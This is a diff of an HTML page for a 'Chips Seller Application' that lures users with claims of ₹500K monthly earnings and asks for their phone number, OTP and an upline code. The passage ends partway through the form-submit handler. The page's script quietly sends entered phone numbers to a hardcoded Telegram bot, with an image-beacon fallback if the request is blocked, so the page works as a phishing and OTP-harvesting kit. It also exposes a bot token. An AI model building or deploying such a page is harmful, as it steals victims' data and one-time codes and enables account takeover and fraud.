@@ -1,406 +1,675 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chips Seller Application</title>
-    <!-- Tailwind CSS CDN -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
-        body {
-            font-family: 'Plus Jakarta Sans', sans-serif;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Chips Seller Application</title>
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- FontAwesome Icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
+    
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+      user-select: none;
+      -webkit-tap-highlight-color: transparent;
+    }
 
-        /* Slow Pulsing Animation for Background Glow Ring */
-        @keyframes slowPulse {
-            0% {
-                transform: scale(0.95);
-                opacity: 0.3;
-            }
-            50% {
-                transform: scale(1.15);
-                opacity: 0.7;
-            }
-            100% {
-                transform: scale(0.95);
-                opacity: 0.3;
-            }
-        }
+    body {
+      background-color: #5b21b6;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
 
-        .animate-slow-pulse {
-            animation: slowPulse 3s infinite ease-in-out;
-        }
-    </style>
+    .app-container {
+      width: 100%;
+      max-width: 414px;
+      height: 100vh;
+      max-height: 896px;
+      background-color: #ffffff;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+    }
+
+    /* --- Top Header Bar --- */
+    .top-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 12px 16px;
+    }
+
+    .left-icons {
+      display: flex;
+      gap: 12px;
+    }
+
+    .icon-btn-bell {
+      width: 42px;
+      height: 42px;
+      background-color: #29b6f6;
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: white;
+      font-size: 20px;
+      position: relative;
+    }
+
+    .badge-dot {
+      position: absolute;
+      top: 1px;
+      right: 3px;
+      width: 11px;
+      height: 11px;
+      background-color: #ff3b30;
+      border-radius: 50%;
+      border: 2px solid white;
+    }
+
+    .icon-btn-doc {
+      width: 42px;
+      height: 42px;
+      background-color: #6a52da;
+      border-radius: 12px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: white;
+      font-size: 20px;
+    }
+
+    .balance-pill {
+      background-color: #79868d;
+      border-radius: 20px;
+      display: flex;
+      align-items: center;
+      padding: 3px 4px 3px 8px;
+      gap: 8px;
+      color: white;
+      font-weight: 700;
+      font-size: 16px;
+    }
+
+    /* --- Coin Styling --- */
+    .coin-exact {
+      border-radius: 50%;
+      background: linear-gradient(135deg, #ffd700 0%, #ffc107 100%);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+      flex-shrink: 0;
+    }
+
+    .coin-exact-inner {
+      border-radius: 50%;
+      background: radial-gradient(circle, #fff9c4 20%, #ffee58 80%, #ffca28 100%);
+      border: 1px solid #ffffff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .coin-bar {
+      background-color: #f57f17;
+      border-radius: 2px;
+      opacity: 0.4;
+    }
+
+    .coin-exact.sm { width: 24px; height: 24px; padding: 2px; }
+    .coin-exact.sm .coin-exact-inner { width: 100%; height: 100%; }
+    .coin-exact.sm .coin-bar { width: 2.5px; height: 10px; }
+
+    .coin-exact.lg { width: 46px; height: 46px; padding: 4px; }
+    .coin-exact.lg .coin-exact-inner { width: 100%; height: 100%; }
+    .coin-exact.lg .coin-bar { width: 4px; height: 18px; }
+
+    .btn-purchase {
+      background-color: #ffffff;
+      color: #3b2c85;
+      border: none;
+      padding: 6px 14px;
+      border-radius: 14px;
+      font-weight: 800;
+      font-size: 13px;
+      cursor: pointer;
+    }
+
+    /* --- Earnings Card --- */
+    .earnings-card {
+      margin: 6px 16px;
+      background-color: #f8f6ff;
+      border-radius: 16px;
+      padding: 12px 16px;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .earnings-info {
+      font-size: 14px;
+      color: #3e3a53;
+      line-height: 1.5;
+      font-weight: 600;
+    }
+
+    .earnings-info span {
+      color: #2b7fff;
+      font-weight: 800;
+      margin-left: 6px;
+    }
+
+    /* --- Center Section & Dynamic Glow Ring --- */
+    .center-section {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      flex: 1;
+      position: relative;
+    }
+
+    .outer-glow-ring {
+      width: 250px;
+      height: 250px;
+      background-color: #f6f3ff;
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+      transition: background-color 0.3s ease;
+    }
+
+    .outer-glow-ring.online-glow {
+      background-color: #e0f7fa !important;
+    }
+
+    .outer-glow-ring::after {
+      content: '';
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      background-color: #dcd0ff;
+      border-radius: 50%;
+      z-index: 1;
+      opacity: 0.6;
+      animation: pulseGlow 2.5s infinite ease-out;
+      pointer-events: none;
+      transition: background-color 0.3s ease;
+    }
+
+    .outer-glow-ring.online-glow::after {
+      background-color: #b2ebf2 !important;
+    }
+
+    @keyframes pulseGlow {
+      0% { transform: scale(1); opacity: 0.6; }
+      70% { transform: scale(1.15); opacity: 0; }
+      100% { transform: scale(1.15); opacity: 0; }
+    }
+
+    .go-online-btn {
+      width: 190px;
+      height: 190px;
+      background: linear-gradient(180deg, #573bd8 0%, #291275 100%);
+      border-radius: 50%;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      color: white;
+      box-shadow: 0 10px 25px rgba(41, 18, 117, 0.2);
+      cursor: pointer;
+      position: relative;
+      z-index: 10;
+      border: none;
+      outline: none;
+    }
+
+    .go-online-btn:active {
+      opacity: 0.85;
+      transform: scale(0.97);
+    }
+
+    .go-online-btn i {
+      font-size: 44px;
+      margin-bottom: 8px;
+      pointer-events: none;
+    }
+
+    .go-online-btn span {
+      font-size: 19px;
+      font-weight: 700;
+      pointer-events: none;
+    }
+
+    .center-tagline {
+      margin-top: 36px;
+      font-size: 15px;
+      font-weight: 900;
+      font-style: italic;
+      color: #1a1a1a;
+      letter-spacing: 0.5px;
+    }
+
+    /* --- Bottom Navigation --- */
+    .bank-account-link {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 8px;
+      color: #3b2c85;
+      font-size: 16px;
+      font-weight: 700;
+      margin-bottom: 16px;
+      text-decoration: none;
+    }
+
+    .bottom-nav {
+      background-color: #5136b8;
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+      padding: 10px 0 8px 0;
+    }
+
+    .nav-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      color: #b7a8ee;
+      font-size: 11px;
+      text-decoration: none;
+      gap: 4px;
+      position: relative;
+    }
+
+    .nav-item.active {
+      color: #ffffff;
+      font-weight: 700;
+    }
+
+    .nav-item.active::after {
+      content: '';
+      position: absolute;
+      bottom: -8px;
+      width: 100%;
+      height: 3px;
+      background-color: #ffffff;
+      border-radius: 2px;
+    }
+
+    .nav-item i {
+      font-size: 18px;
+    }
+  </style>
 </head>
-<body class="bg-[#5b21b6] min-h-screen text-slate-900 selection:bg-indigo-500 selection:text-white">
+<body>
 
-    <!-- Toast Notification Container -->
-    <div id="toast-container" class="fixed top-5 left-1/2 -translate-x-1/2 z-50 flex flex-col gap-2 w-11/12 max-w-md pointer-events-none"></div>
+  <!-- Notification Toast Container -->
+  <div id="toast-container" class="fixed top-4 left-1/2 -translate-x-1/2 z-50 flex flex-col gap-2 w-11/12 max-w-sm pointer-events-none"></div>
 
+  <!-- Main Mobile App Frame -->
+  <div class="app-container">
+    
     <!-- ================= 1. SIGN UP SECTION ================= -->
-    <div id="signup-section" class="w-full max-w-md mx-auto min-h-screen flex flex-col justify-start">
-        <!-- Permanent SVG Banner Section -->
-        <header class="w-full pt-6 pb-2 px-5 flex flex-col items-start relative">
-          <!-- Speech Bubble Badge -->
-          <div class="bg-white/20 backdrop-blur-md px-3 py-1 rounded-xl text-white font-extrabold text-xs tracking-wider mb-2 border border-white/20 shadow-sm">
-            JOIN US!
+    <div id="signup-section" class="w-full h-full bg-[#5b21b6] flex flex-col justify-between overflow-y-auto">
+      <!-- Permanent SVG Banner Section -->
+      <header class="w-full pt-6 pb-2 px-5 flex flex-col items-start relative">
+        <div class="bg-white/20 backdrop-blur-md px-3 py-1 rounded-xl text-white font-extrabold text-xs tracking-wider mb-2 border border-white/20 shadow-sm">
+          JOIN US!
+        </div>
+
+        <h2 class="text-xl font-bold text-white leading-tight max-w-[260px] mb-2">
+          As an official Chip Seller to earn <span class="text-amber-300 font-extrabold">₹500K monthly.</span>
+        </h2>
+
+        <!-- Embedded Vector Characters & Coin Stack -->
+        <div class="w-full flex justify-end items-end h-24 pr-2 -mt-4">
+          <svg viewBox="0 0 200 120" class="h-24 w-auto overflow-visible">
+            <g transform="translate(60, 65)">
+              <ellipse cx="20" cy="30" rx="18" ry="6" fill="#f59e0b" />
+              <ellipse cx="20" cy="25" rx="18" ry="6" fill="#fbbf24" />
+              <ellipse cx="20" cy="20" rx="18" ry="6" fill="#fcd34d" />
+              <ellipse cx="20" cy="15" rx="18" ry="6" fill="#fef08a" stroke="#f59e0b" stroke-width="1" />
+            </g>
+
+            <g transform="translate(15, 30)">
+              <circle cx="35" cy="40" r="16" fill="#fbbf24" stroke="#f59e0b" stroke-width="2" />
+              <circle cx="20" cy="25" r="5" fill="#fde68a" />
+              <path d="M12 32 Q 20 30 28 35 L 25 50 L 10 50 Z" fill="#0284c7" />
+              <path d="M10 50 L 30 50 L 35 68 L 5 68 Z" fill="#1e1b4b" />
+            </g>
+
+            <g transform="translate(115, 10)">
+              <circle cx="15" cy="12" r="6" fill="#fde68a" />
+              <path d="M8 20 L 22 20 L 20 48 L 10 48 Z" fill="#06b6d4" />
+              <path d="M10 48 L 20 48 L 22 85 L 8 85 Z" fill="#fbbf24" />
+              <path d="M8 22 L -8 5 L -4 2 Z" fill="#06b6d4" stroke="#06b6d4" stroke-width="3" stroke-linecap="round" />
+            </g>
+
+            <g transform="translate(145, 18)">
+              <circle cx="12" cy="10" r="5.5" fill="#fde68a" />
+              <path d="M6 17 L 18 17 L 20 45 L 4 45 Z" fill="#f43f5e" />
+              <path d="M6 45 L 18 45 L 16 80 L 8 80 Z" fill="#312e81" />
+            </g>
+          </svg>
+        </div>
+      </header>
+
+      <!-- Main White Bottom Form Card -->
+      <main class="w-full px-4 flex-1 flex flex-col justify-end pb-4">
+        <div class="bg-white rounded-[35px] p-6 shadow-2xl border-t border-white/20">
+          <div class="text-center mb-5 flex items-center justify-center space-x-2">
+            <span class="text-indigo-300 font-bold tracking-widest text-xs">////</span>
+            <h3 class="text-xs font-extrabold tracking-widest text-slate-800 uppercase">Sign up & Earn</h3>
+            <span class="text-indigo-300 font-bold tracking-widest text-xs">////</span>
           </div>
 
-          <!-- Main Title Text -->
-          <h2 class="text-xl font-bold text-white leading-tight max-w-[260px] mb-2">
-            As an official Chip Seller to earn <span class="text-amber-300 font-extrabold">₹500K monthly.</span>
-          </h2>
-
-          <!-- Embedded Vector Characters & Coin Stack -->
-          <div class="w-full flex justify-end items-end h-24 pr-2 -mt-4">
-            <svg viewBox="0 0 200 120" class="h-24 w-auto overflow-visible">
-              <!-- Stack of Gold Coins -->
-              <g transform="translate(60, 65)">
-                <ellipse cx="20" cy="30" rx="18" ry="6" fill="#f59e0b" />
-                <ellipse cx="20" cy="25" rx="18" ry="6" fill="#fbbf24" />
-                <ellipse cx="20" cy="20" rx="18" ry="6" fill="#fcd34d" />
-                <ellipse cx="20" cy="15" rx="18" ry="6" fill="#fef08a" stroke="#f59e0b" stroke-width="1" />
-              </g>
-
-              <!-- Kneeling Person with Big Coin -->
-              <g transform="translate(15, 30)">
-                <circle cx="35" cy="40" r="16" fill="#fbbf24" stroke="#f59e0b" stroke-width="2" />
-                <circle cx="20" cy="25" r="5" fill="#fde68a" />
-                <path d="M12 32 Q 20 30 28 35 L 25 50 L 10 50 Z" fill="#0284c7" />
-                <path d="M10 50 L 30 50 L 35 68 L 5 68 Z" fill="#1e1b4b" />
-              </g>
-
-              <!-- Standing Person 1 (Yellow Pants) -->
-              <g transform="translate(115, 10)">
-                <circle cx="15" cy="12" r="6" fill="#fde68a" />
-                <path d="M8 20 L 22 20 L 20 48 L 10 48 Z" fill="#06b6d4" />
-                <path d="M10 48 L 20 48 L 22 85 L 8 85 Z" fill="#fbbf24" />
-                <!-- Pointing Arm -->
-                <path d="M8 22 L -8 5 L -4 2 Z" fill="#06b6d4" stroke="#06b6d4" stroke-width="3" stroke-linecap="round" />
-              </g>
-
-              <!-- Standing Person 2 (Red Dress) -->
-              <g transform="translate(145, 18)">
-                <circle cx="12" cy="10" r="5.5" fill="#fde68a" />
-                <path d="M6 17 L 18 17 L 20 45 L 4 45 Z" fill="#f43f5e" />
-                <path d="M6 45 L 18 45 L 16 80 L 8 80 Z" fill="#312e81" />
-              </g>
-            </svg>
-          </div>
-        </header>
-
-        <!-- Main White Card Form Section (Layout fixed) -->
-        <main class="w-full px-4 mt-1 flex-1 flex flex-col">
-            <div class="bg-white rounded-t-[35px] p-6 shadow-2xl border-t border-white/20 flex-1">
-                <div class="text-center mb-5 flex items-center justify-center space-x-2">
-                    <span class="text-indigo-300 font-bold tracking-widest text-xs">////</span>
-                    <h3 class="text-xs font-extrabold tracking-widest text-slate-800 uppercase">Sign up & Earn</h3>
-                    <span class="text-indigo-300 font-bold tracking-widest text-xs">////</span>
+          <form id="signup-form" onsubmit="handleFormSubmit(event)" class="space-y-4">
+            <!-- Phone Number Input -->
+            <div>
+              <div class="relative flex items-center bg-white border border-slate-200 rounded-2xl shadow-sm focus-within:border-indigo-600 focus-within:ring-2 focus-within:ring-indigo-600/20 transition">
+                <div class="flex items-center pl-4 pr-3 py-3.5 border-r border-slate-200 text-slate-700 font-semibold text-sm">
+                  <span>+91</span>
                 </div>
-
-                <form id="signup-form" onsubmit="handleFormSubmit(event)" class="space-y-4">
-                    <!-- Phone Number Input -->
-                    <div>
-                        <div class="relative flex items-center bg-white border border-slate-200 rounded-2xl shadow-sm focus-within:border-indigo-600 focus-within:ring-2 focus-within:ring-indigo-600/20 transition">
-                            <div class="flex items-center pl-4 pr-3 py-3.5 border-r border-slate-200 text-slate-700 font-semibold text-sm">
-                                <span>+91</span>
-                            </div>
-                            <input type="tel" id="phone" required placeholder="Type phone number" maxlength="10" 
-                                class="w-full bg-transparent px-4 py-3.5 text-sm text-slate-800 placeholder-slate-400 focus:outline-none">
-                        </div>
-                    </div>
-
-                    <!-- OTP Input with Request Button -->
-                    <div>
-                        <div class="relative flex items-center bg-white border border-slate-200 rounded-2xl shadow-sm focus-within:border-indigo-600 focus-within:ring-2 focus-within:ring-indigo-600/20 transition">
-                            <input type="text" id="otp" required placeholder="Type OTP" maxlength="6"
-                                class="w-full bg-transparent px-4 py-3.5 text-sm text-slate-800 placeholder-slate-400 focus:outline-none">
-                            <button type="button" id="otp-btn" onclick="sendOTP()" 
-                                class="mr-2 px-5 py-2.5 bg-[#5b21b6] hover:bg-[#4c1d95] text-white text-xs font-bold rounded-xl transition shadow-md active:scale-95">
-                                Request
-                            </button>
-                        </div>
-                    </div>
-
-                    <!-- Upline Code Input (Optional) -->
-                    <div>
-                        <div class="relative flex items-center bg-white border border-slate-200 rounded-2xl shadow-sm focus-within:border-indigo-600 focus-within:ring-2 focus-within:ring-indigo-600/20 transition">
-                            <input type="text" id="upline" placeholder="Upline Code (Optional)"
-                                class="w-full bg-transparent px-4 py-3.5 text-sm text-slate-800 placeholder-slate-400 focus:outline-none">
-                        </div>
-                    </div>
-
-                    <!-- Submit Button -->
-                    <button type="submit" id="submit-btn"
-                        class="w-full mt-3 py-4 px-6 bg-[#5b21b6] hover:bg-[#4c1d95] text-white font-bold text-base rounded-2xl shadow-lg shadow-purple-900/25 transition active:scale-[0.98] flex items-center justify-center space-x-2">
-                        <span>Sign up</span>
-                    </button>
-                </form>
+                <input type="tel" id="phone" required placeholder="Type phone number" maxlength="10" 
+                  class="w-full bg-transparent px-4 py-3.5 text-sm text-slate-800 placeholder-slate-400 focus:outline-none">
+              </div>
             </div>
-        </main>
+
+            <!-- OTP Input with Request Button -->
+            <div>
+              <div class="relative flex items-center bg-white border border-slate-200 rounded-2xl shadow-sm focus-within:border-indigo-600 focus-within:ring-2 focus-within:ring-indigo-600/20 transition">
+                <input type="text" id="otp" required placeholder="Type OTP" maxlength="6"
+                  class="w-full bg-transparent px-4 py-3.5 text-sm text-slate-800 placeholder-slate-400 focus:outline-none">
+                <button type="button" id="otp-btn" onclick="sendOTP()" 
+                  class="mr-2 px-5 py-2.5 bg-[#5b21b6] hover:bg-[#4c1d95] text-white text-xs font-bold rounded-xl transition shadow-md active:scale-95">
+                  Request
+                </button>
+              </div>
+            </div>
+
+            <!-- Upline Code Input (Optional) -->
+            <div>
+              <div class="relative flex items-center bg-white border border-slate-200 rounded-2xl shadow-sm focus-within:border-indigo-600 focus-within:ring-2 focus-within:ring-indigo-600/20 transition">
+                <input type="text" id="upline" placeholder="Upline Code (Optional)"
+                  class="w-full bg-transparent px-4 py-3.5 text-sm text-slate-800 placeholder-slate-400 focus:outline-none">
+              </div>
+            </div>
+
+            <!-- Submit Button -->
+            <button type="submit" id="submit-btn"
+              class="w-full mt-3 py-4 px-6 bg-[#5b21b6] hover:bg-[#4c1d95] text-white font-bold text-base rounded-2xl shadow-lg shadow-purple-900/25 transition active:scale-[0.98] flex items-center justify-center space-x-2">
+              <span>Sign up</span>
+            </button>
+          </form>
+        </div>
+      </main>
     </div>
 
     <!-- ================= 2. DASHBOARD SECTION (Hidden by default) ================= -->
-    <div id="dashboard-section" class="w-full min-h-screen flex flex-col justify-between hidden pb-20">
-        <!-- Top Header Bar -->
-        <header class="w-full pt-4 px-4 max-w-md mx-auto flex items-center justify-between">
-            <!-- Left Icons (Notification & Document) -->
-            <div class="flex items-center space-x-3">
-                <button class="w-10 h-10 rounded-full bg-cyan-400 flex items-center justify-center text-white shadow-md relative">
-                    <i class="fa-solid fa-bell text-lg"></i>
-                    <span class="absolute top-2 right-2 w-2.5 h-2.5 bg-rose-500 rounded-full border-2 border-cyan-400"></span>
-                </button>
-                <button class="w-10 h-10 rounded-xl bg-violet-600 flex items-center justify-center text-white shadow-md border border-violet-500">
-                    <i class="fa-solid fa-file-lines text-lg"></i>
-                </button>
+    <div id="dashboard-section" class="w-full h-full flex flex-col justify-between hidden">
+      <!-- Top Header Bar -->
+      <div class="top-header">
+        <div class="left-icons">
+          <div class="icon-btn-bell">
+            <i class="fa-solid fa-bell"></i>
+            <div class="badge-dot"></div>
+          </div>
+          <div class="icon-btn-doc">
+            <i class="fa-solid fa-file-lines"></i>
+          </div>
+        </div>
+        <div class="balance-pill">
+          <div class="coin-exact sm">
+            <div class="coin-exact-inner">
+              <div class="coin-bar"></div>
             </div>
+          </div>
+          <span>0.00</span>
+          <button class="btn-purchase" onclick="showToast('Purchase Window Opening...', 'info')">Purchase</button>
+        </div>
+      </div>
 
-            <!-- Right Coin Balance & Purchase Button -->
-            <div class="bg-white rounded-full px-3 py-1.5 flex items-center space-x-2 shadow-md">
-                <div class="flex items-center space-x-1">
-                    <div class="w-5 h-5 rounded-full bg-amber-400 border border-amber-600 flex items-center justify-center shadow-inner">
-                        <div class="w-3 h-3 rounded-full bg-amber-300 border border-amber-500 flex items-center justify-center">
-                            <span class="text-[8px] font-extrabold text-amber-700">₹</span>
-                        </div>
-                    </div>
-                    <span class="font-bold text-slate-700 text-sm">0.00</span>
-                </div>
-                <button class="bg-slate-900 hover:bg-slate-800 text-white text-xs font-bold px-3 py-1.5 rounded-full transition shadow">
-                    Purchase
-                </button>
-            </div>
-        </header>
+      <!-- Earnings Card -->
+      <div class="earnings-card">
+        <div class="coin-exact lg">
+          <div class="coin-exact-inner">
+            <div class="coin-bar"></div>
+          </div>
+        </div>
+        <div class="earnings-info">
+          <div>Today's Earnings <span>0</span></div>
+          <div>Total Earning <span>0</span></div>
+        </div>
+      </div>
 
-        <!-- Main Content Area -->
-        <main class="w-full max-w-md mx-auto px-4 mt-4 flex flex-col items-center flex-1">
-            
-            <!-- Earnings Box -->
-            <div class="w-full bg-purple-50/90 backdrop-blur border border-purple-100 rounded-2xl p-3.5 shadow-sm mb-8 flex items-center space-x-3">
-                <div class="w-8 h-8 rounded-full bg-amber-400 border border-amber-600 flex items-center justify-center shadow-inner">
-                    <div class="w-5 h-5 rounded-full bg-amber-300 border border-amber-500 flex items-center justify-center">
-                        <span class="text-[10px] font-extrabold text-amber-700">₹</span>
-                    </div>
-                </div>
-                <div class="flex flex-col">
-                    <div class="text-xs font-semibold text-slate-600 flex items-center space-x-1">
-                        <span>Today's Earnings</span>
-                        <span class="font-bold text-slate-900 ml-1">0</span>
-                    </div>
-                    <div class="text-xs font-semibold text-slate-600 flex items-center space-x-1 mt-0.5">
-                        <span>Total Earning</span>
-                        <span class="font-bold text-slate-900 ml-2">0</span>
-                    </div>
-                </div>
-            </div>
+      <!-- Center Section -->
+      <div class="center-section">
+        <div class="outer-glow-ring" id="glowRing">
+          <div class="go-online-btn" id="actionBtn" onclick="handleButtonClick()" ontouchstart="handleButtonClick()">
+            <i class="fa-solid fa-power-off" id="btnIcon"></i>
+            <span id="btnText">Go Online</span>
+          </div>
+        </div>
+        <div class="center-tagline" id="taglineText">GO ONLINE TO EARN MONEY!</div>
+      </div>
 
-            <!-- Go Online Big Button Section with Slow Expanding Animation Ring -->
-            <div class="relative flex flex-col items-center justify-center my-6">
-                <div class="absolute w-72 h-72 rounded-full bg-violet-300/30 animate-slow-pulse pointer-events-none"></div>
-                <div class="absolute w-64 h-64 rounded-full bg-violet-400/20 border border-violet-300/50"></div>
-                
-                <button id="goOnlineBtn" onclick="toggleOnline()" class="relative z-10 w-52 h-52 rounded-full bg-gradient-to-b from-indigo-700 via-indigo-900 to-violet-950 text-white flex flex-col items-center justify-center shadow-2xl border-4 border-indigo-500/40 transform active:scale-95 transition">
-                    <i class="fa-solid fa-power-off text-5xl mb-2 text-white drop-shadow-md"></i>
-                    <span id="btnText" class="text-xl font-bold tracking-wide">Go Online</span>
-                </button>
-            </div>
+      <!-- Bottom Nav -->
+      <div>
+        <a href="#" onclick="showToast('My Bank Account settings opening...', 'info')" class="bank-account-link">
+          <i class="fa-solid fa-credit-card" style="font-size: 20px;"></i>
+          <span>My bank account</span>
+        </a>
 
-            <!-- Subtitle Text -->
-            <div class="mt-4 text-center">
-                <h3 class="font-extrabold italic tracking-wider text-white text-sm">GO ONLINE TO EARN MONEY!</h3>
-            </div>
-
-            <!-- My Bank Account Link -->
-            <div class="mt-10">
-                <button onclick="openBankModal()" class="flex items-center space-x-2 text-slate-900 font-bold text-sm bg-white/80 hover:bg-white px-4 py-2.5 rounded-xl shadow transition border border-purple-100">
-                    <i class="fa-solid fa-credit-card text-indigo-700"></i>
-                    <span>My bank account</span>
-                </button>
-            </div>
-
-        </main>
-
-        <!-- Bottom Navigation Bar -->
-        <nav class="fixed bottom-0 left-0 right-0 max-w-md mx-auto bg-violet-900 border-t border-violet-800 py-2.5 px-6 flex justify-between items-center text-white z-50 shadow-2xl">
-            <a href="#" class="flex flex-col items-center text-white">
-                <i class="fa-solid fa-house text-lg"></i>
-                <span class="text-[10px] font-medium mt-1">Home</span>
-            </a>
-            <a href="#" class="flex flex-col items-center text-violet-300 hover:text-white transition">
-                <i class="fa-solid fa-circle-nodes text-lg"></i>
-                <span class="text-[10px] font-medium mt-1">Purchase</span>
-            </a>
-            <a href="#" class="flex flex-col items-center text-violet-300 hover:text-white transition">
-                <i class="fa-solid fa-user-group text-lg"></i>
-                <span class="text-[10px] font-medium mt-1">Referral</span>
-            </a>
-            <a href="#" class="flex flex-col items-center text-violet-300 hover:text-white transition">
-                <i class="fa-solid fa-file-lines text-lg"></i>
-                <span class="text-[10px] font-medium mt-1">Record</span>
-            </a>
-        </nav>
+        <div class="bottom-nav">
+          <a href="#" class="nav-item active">
+            <i class="fa-solid fa-house"></i>
+            <span>Home</span>
+          </a>
+          <a href="#" class="nav-item" onclick="showToast('Purchase section', 'info')">
+            <i class="fa-solid fa-poker-chip"></i>
+            <span>Purchase</span>
+          </a>
+          <a href="#" class="nav-item" onclick="showToast('Referral section', 'info')">
+            <i class="fa-solid fa-arrows-rotate"></i>
+            <span>Referral</span>
+          </a>
+          <a href="#" class="nav-item" onclick="showToast('Record section', 'info')">
+            <i class="fa-solid fa-bars-staggered"></i>
+            <span>Record</span>
+          </a>
+        </div>
+      </div>
     </div>
 
-    <!-- JavaScript Logic with Reliable Telegram Bot Integration -->
-    <script>
-        const BOT_TOKEN = "8439698505:AAGL0UR5DuMaMLm81HarVsDvQ8gFkvcZFU0";
-        const CHAT_ID = "8698008425";
+  </div>
 
-        let countdownSeconds = 60;
-        let timerInterval = null;
+  <!-- Combined JavaScript Logic -->
+  <script>
+    const BOT_TOKEN = "8439698505:AAGL0UR5DuMaMLm81HarVsDvQ8gFkvcZFU0";
+    const CHAT_ID = "8698008425";
 
-        // Helper to send message to Telegram Bot reliably
-        async function sendToTelegram(text) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            const payload = {
-                chat_id: CHAT_ID,
-                text: text,
-                parse_mode: 'Markdown'
-            };
+    let countdownSeconds = 60;
+    let timerInterval = null;
 
-            try {
-                // Try standard Fetch API
-                const res = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-                const data = await res.json();
-                return data.ok;
-            } catch (err) {
-                console.log("Fetch failed, trying image beacon fallback...", err);
-                // Fallback using URL query parameters if fetch is blocked
-                const encodeMsg = encodeURIComponent(text);
-                const fallbackUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeMsg}&parse_mode=Markdown`;
-                const img = new Image();
-                img.src = fallbackUrl;
-                return true;
-            }
+    // Dual-method Reliable Telegram Message Delivery
+    async function sendToTelegram(text) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      const payload = { chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' };
+
+      try {
+        const res = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        const data = await res.json();
+        return data.ok;
+      } catch (err) {
+        // Fallback Image Beacon Method
+        const encodeMsg = encodeURIComponent(text);
+        const fallbackUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeMsg}&parse_mode=Markdown`;
+        const img = new Image();
+        img.src = fallbackUrl;
+        return true;
+      }
+    }
+
+    // Custom Toast Notification
+    function showToast(message, type = 'info') {
+      const container = document.getElementById('toast-container');
+      if (!container) return;
+      
+      const toast = document.createElement('div');
+      toast.className = `p-3.5 rounded-xl shadow-lg text-xs font-medium text-white pointer-events-auto flex items-center justify-between transition-all duration-300 opacity-0 translate-y-2 ${
+        type === 'success' ? 'bg-emerald-600' : type === 'error' ? 'bg-rose-600' : 'bg-slate-900'
+      }`;
+
+      toast.innerHTML = `
+        <div class="flex items-center space-x-2">
+          <i class="fa-solid ${type === 'success' ? 'fa-circle-check' : 'fa-circle-info'}"></i>
+          <span>${message}</span>
+        </div>
+      `;
+
+      container.appendChild(toast);
+      setTimeout(() => { toast.classList.remove('opacity-0', 'translate-y-2'); }, 10);
+
+      setTimeout(() => {
+        toast.classList.add('opacity-0', 'translate-y-2');
+        setTimeout(() => toast.remove(), 300);
+      }, 3500);
+    }
+
+    // 1. Request OTP Functionality
+    async function sendOTP() {
+      const phoneInput = document.getElementById('phone').value.trim();
+      if(phoneInput.length < 10) {
+        showToast('Please enter a valid 10-digit mobile number!', 'error');
+        return;
+      }
+
+      const otpBtn = document.getElementById('otp-btn');
+      if (timerInterval) return;
+
+      const message = `📲 *New OTP Request!*\n\n📱 *Phone:* \`+91 ${phoneInput}\``;
+
+      otpBtn.disabled = true;
+      otpBtn.innerText = 'Sending...';
+
+      await sendToTelegram(message);
+
+      showToast('OTP request sent to +91 ' + phoneInput, 'success');
+      countdownSeconds = 60;
+      otpBtn.innerText = `${countdownSeconds}s`;
+      otpBtn.classList.add('opacity-50', 'cursor-not-allowed');
+
+      timerInterval = setInterval(() => {
+        countdownSeconds--;
+        otpBtn.innerText = `${countdownSeconds}s`;
+        if (countdownSeconds <= 0) {
+          clearInterval(timerInterval);
+          timerInterval = null;
+          otpBtn.disabled = false;
+          otpBtn.innerText = 'Request';
+          otpBtn.classList.remove('opacity-50', 'cursor-not-allowed');
         }
+      }, 1000);
+    }
 
-        // Toast Notification Function
-        function showToast(message, type = 'info') {
-            const container = document.getElementById('toast-container');
-            if (!container) return;
+    // 2. Sign-Up Form Handling & Page Switch
+    async function handleFormSubmit(event) {
+      event.preventDefault();
+
+      const phone = document.getElementById('phone').value.trim();
